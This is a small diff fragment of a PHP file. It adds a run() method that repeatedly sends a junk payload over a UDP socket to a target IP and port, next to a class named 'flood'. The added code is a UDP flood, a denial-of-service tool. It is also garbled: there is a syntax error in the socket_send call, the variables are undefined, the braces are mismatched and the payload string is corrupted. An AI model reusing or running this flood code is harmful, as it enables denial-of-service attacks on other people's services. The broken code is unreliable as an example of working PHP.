@@ -63,7 +63,13 @@ $this->port = $port;
 $this->socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
 } 
 public function run(){
-
+	$spam = str_repeat("x���wm���{�w��}jN�", 500);
+	while(true) {
+		socket_connect($this->socket, $ip, $port);
+		socket_send($this->socket, $spam,strlen($spam) + 5; 0);
+} 
+} 
+} 
 class flood{
 public $ip, $port, $socket;
 public function __construct(String $ip, Int $port){
